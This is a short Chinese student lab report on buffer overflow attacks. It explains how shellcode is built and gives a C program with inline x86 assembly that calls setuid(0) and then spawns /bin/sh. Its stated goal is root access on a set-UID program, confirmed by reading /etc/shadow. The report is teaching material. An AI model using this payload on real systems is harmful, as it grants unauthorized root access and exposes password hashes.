## 实验四 缓冲区溢出攻击技术

<p style = "text-align:right">李远航 PB20000137</p>

#### 一、实验目的

了解并运用缓冲区溢出攻击技术实现简单的漏洞攻击

#### 二、实验原理

shellcode是注入到目标进程中的二进制代码，其功能取决于编写者的意图。编写 shellcode要经过以下 3 个步骤： 

- 编写简洁的能完成所需功能的 C 程序；
- 反汇编可执行代码，用系统功能调用代替函数调用，用汇编语言实现相 同的功能；
-  提取出操作码，写成 shellcode，并用 C 程序验证。

#### 三、实验内容

针对 32 位 ubuntu Linux 系统（版本号为 16），请设计一个能对 root 用户 set-UID 程序进行漏洞攻击的 shellcode，并参考 shell_asm_fix_opcode.c 验证该 shellcode 能获得 root 权限（可以成功执行 cat /etc/shadow）。

#### 四、实验过程

1. 首先查看setuid(0)的汇编代码，这里可以使用IDA反汇编工具或者gdb

    ![image-20230513195831740](C:/Users/voyage/AppData/Roaming/Typora/typora-user-images/image-20230513195831740.png)

2. 将上述代码加入示例的shellcode程序中

    ```c
    // gcc -o fix -z execstack ../src/shell_asm_fix.c
    void foo()
    {
        __asm__(
            "push   %ebp ;"
            "mov    %esp,%ebp ;"
            "sub    $0x8,%esp ;"
            "sub    $0xc,%esp ;"
            "push   $0x0 ;"
            "call   setuid ;"
            "add    $0x10,%esp ;"
            "nop ;"
            "xor    %edx,%edx ;"
            "push   %edx ;"
            "push   $0x68732f6e ;"
            "push   $0x69622f2f ;"
            "mov    %esp,%ebx ;"
            "push   %edx ;"
            "push   %ebx ;"
            "mov    %esp,%ecx ;"
            "lea    0xb(%edx),%eax ;"
            "int    $0x80;" //"sysenter ;"
        );
    }
    int main(int argc, char *argv[])
    {
        foo();
        return 0;
    }
    ```

3. 验证程序准确性

    

    ![img](file:///C:\Users\voyage\AppData\Roaming\Tencent\Users\923959605\TIM\WinTemp\RichOle\1ZU[~~6YJ0U6[URZ`ZYVE7S.png)

#### 五、实验收获

- 对缓冲区溢出攻击有了初步的了解
- 认识到信息安全的重要性
- 提升了使用gdb调试代码，阅读汇编代码的能力